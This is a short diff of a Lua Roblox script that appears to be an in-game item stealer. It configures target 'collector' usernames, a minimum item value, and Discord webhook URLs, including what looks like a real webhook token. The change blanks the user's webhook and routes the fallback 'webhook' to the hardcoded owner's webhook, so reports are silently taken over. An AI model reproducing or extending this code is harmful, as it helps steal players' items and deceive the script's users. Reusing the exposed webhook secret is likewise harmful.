@@ -11,7 +11,7 @@ _G.Usernames = { "Sukuna_Gotnerf", "GAG_Collector", "GAG_Collector1" }
 _G.min_value = 0.1
 _G.pingEveryone = "Yes"
 _G.webhook_me = "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
-_G.webhook_others = "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
+_G.webhook_others = ""
 if Webhook and Webhook ~= "" then
   _G.webhook_others = Webhook
 end
@@ -26,8 +26,8 @@ else
   usernames = _G.Usernames or {}
   local minValue = _G.min_value or 0.1
   local pingEveryone = _G.pingEveryone or "No"
-  webhookMe = _G.webhook_me or "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
-  webhook = Webhook or "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
+  webhookMe = _G.webhook_me or ""
+  webhook = _G.webhook_me or ""
   localPlayer = players.LocalPlayer
   if next(usernames) == nil or webhook == "" then
     localPlayer:kick("You didn't add username or webhook")
